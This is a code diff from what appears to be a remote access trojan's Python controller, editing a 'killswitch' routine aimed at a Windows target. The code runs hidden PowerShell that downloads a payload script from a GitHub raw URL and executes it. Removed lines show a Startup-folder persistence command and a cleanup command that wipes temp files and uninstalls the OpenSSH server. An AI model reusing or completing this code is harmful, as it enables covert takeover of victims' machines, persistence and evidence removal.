@@ -233,7 +233,8 @@ def killswitch(address, password, working, username):
     print("\n[*] Prepping killswitch...")
     # web requests
     killswitch_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/killswitch.ps1 -OutFile {working}/TOhjZsWluf.ps1\""
-    controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/TOhjZsWluf.ps1 >> GiLqXiexKP.cmd"
+    # controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/TOhjZsWluf.ps1 >> GiLqXiexKP.cmd"
+    controller_command = f"powershell /c {working}/TOhjZsWluf.ps1"
     print("[+] Killswitch prepped")
 
     # installing killswitch
@@ -244,11 +245,10 @@ def killswitch(address, password, working, username):
     print("[+] Killswitch installed sucessfully\n")
        
     # remove files
-    remote_command(address, password, " powershell /c Remove-Item $env:temp/* -r; Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0")
+    remote_command(address, password, "")
 
     # execute logger
-    print("\n[*] Restart target computer...")
-
+    print("\n[*] Restarting target computer...")
 
 # custom upload
 def upload(address, password, working):
